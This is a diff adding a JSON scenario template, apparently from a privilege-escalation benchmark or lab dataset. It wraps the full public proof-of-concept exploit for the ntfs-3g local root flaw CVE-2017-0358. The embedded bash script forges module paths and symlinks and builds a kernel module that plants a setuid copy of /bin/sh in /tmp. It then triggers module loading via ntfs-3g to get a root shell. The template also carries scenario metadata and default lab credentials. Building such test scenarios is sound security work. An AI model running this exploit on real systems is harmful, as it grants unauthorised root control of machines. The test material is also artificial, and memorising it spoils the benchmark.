@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_41240",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: ntfs-3g (Debian 9) - Local Privilege Escalation (CVE-2017-0358)\n\nExploit source code (41240.sh):\n```\n#!/bin/bash\necho \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"\necho \"@  CVE-2017-0359, PoC by Kristian Erik Hermansen  @\"\necho \"@  ntfs-3g local privilege escalation to root     @\"\necho \"@  Credits to Google Project Zero                 @\"\necho \"@  Affects: Debian 9/8/7, Ubuntu, Gentoo, others  @\"\necho \"@  Tested: Debian 9 (Stretch)                     @\"\necho \"@  Date: 2017-02-03                               @\"\necho \"@  Link: https://goo.gl/A9I8Vq                    @\"\necho \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\"\necho \"[*] Gathering environment info ...\"\ncwd=\"$(pwd)\"\nun=\"$(uname -r)\"\ndlm=\"$(pwd)/lib/modules\"\ndkf=\"$(pwd)/kernel/fs\"\necho \"[*] Creating kernel hijack directories ...\"\nmkdir -p \"${dlm}\"\nmkdir -p \"${dkf}\"\necho \"[*] Forging symlinks ...\"\nln -sf \"${cwd}\" \"${dlm}/${un}\"\nln -sf \"${cwd}\" \"${dkf}/fuse\"\nln -sf cve_2017_0358.ko fuse.ko\necho \"[*] Pulling in deps ... \"\necho \"[*] Building kernel module ... \"\n\ncat << 'EOF' > cve_2017_0358.c\n#include <linux/module.h>\n\nMODULE_LICENSE(\"CC\");\nMODULE_AUTHOR(\"kristian erik hermansen <kristian.hermansen+CVE-2017-0358@gmail.com>\");\nMODULE_DESCRIPTION(\"PoC for CVE-2017-0358 from Google Project Zero\");\n\nint init_module(void) {\n  printk(KERN_INFO \"[!] Exploited CVE-2017-0358 successfully; may want to patch your system!\\n\");\n  char *envp[] = { \"HOME=/tmp\", NULL };\n  char *argv[] = { \"/bin/sh\", \"-c\", \"/bin/cp /bin/sh /tmp/r00t; /bin/chmod u+s /tmp/r00t\", NULL };\n  call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n  char *argvv[] = { \"/bin/sh\", \"-c\", \"/sbin/rmmod cve_2017_0358\", NULL };\n  call_usermodehelper(argv[0], argvv, envp, UMH_WAIT_EXEC);\n  return 0;\n}\n\nvoid cleanup_module(void) {\n  printk(KERN_INFO \"[*] CVE-2017-0358 exploit unloading ...\\n\");\n}\nEOF\n\ncat << 'EOF' > Makefile\nobj-m += cve_2017_0358.o\n\nall:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\nEOF\n\nmake 1>/dev/null 2>/dev/null || echo \"[-] FAILED: your need make / build tools\"\ncp \"/lib/modules/${un}/modules.dep.bin\" . || echo \"[-] FAILED: linux-image location non-default?\"\nMODPROBE_OPTIONS=\"-v -d ${cwd}\" ntfs-3g /dev/null /dev/null 1>/dev/null 2>/dev/null\n/tmp/r00t -c 'whoami' | egrep -q 'root' && echo \"[+] SUCCESS: You have root. Don't be evil :)\"\n/tmp/r00t\n\necho << 'EOF'\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+'@@@@@########@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+++'';+'###''#'+'@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n@@@@@@@@@@@@@@@@@@@@@@@@@@@@@\n```",
+  "cve": "CVE-2017-0358",
+  "exploitdb_id": "41240",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_41240",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
